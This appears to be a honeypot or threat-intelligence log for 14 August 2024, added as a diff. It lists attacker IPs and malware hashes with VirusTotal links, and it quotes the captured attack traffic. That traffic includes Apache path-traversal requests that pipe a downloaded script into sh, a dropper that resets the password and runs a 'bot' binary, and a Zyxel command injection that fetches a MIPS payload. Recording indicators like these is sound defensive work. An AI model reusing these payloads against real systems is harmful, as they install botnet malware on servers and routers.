@@ -1,0 +1,57 @@
+Top 5 IPs for 14-08-2024 :
+
+43.133.58.7
+51.77.215.145
+119.10.178.118
+36.67.70.198
+124.89.43.98
+
+
+Malware Observed:
+
+
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+
+
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed
+
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: <Host IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 101
+
+X=$(curl http://45.14.226.13/sh || wget http://45.14.226.13/sh -O-); echo "$X" | sh -s apache.selfrepPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Host:  <Host IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 101
+
+X=$(curl http://45.14.226.13/sh || wget http://45.14.226.13/sh -O-); echo "$X" | sh -s apache.selfrep
+
+
+CMD: lscpu | grep "CPU(s):                " && echo -e "9nz66TbaU9Y8\\n9nz66TbaU9Y8" | passwd && pkill bin.x86_64; cd /tmp; wget http://45.89.28.202/bot; curl -s -O http://45.89.28.202/bot; chmod 777 bot; ./bot; iptables -A INPUT -s 194.50.16.26 -j DROP; iptables -A INPUT -s 85.239.34.237 -j DROP; iptables -A INPUT -s 186.2.171.36 -j DROP
+
+
+/bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.245.236.146/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
+
+
+
+
+
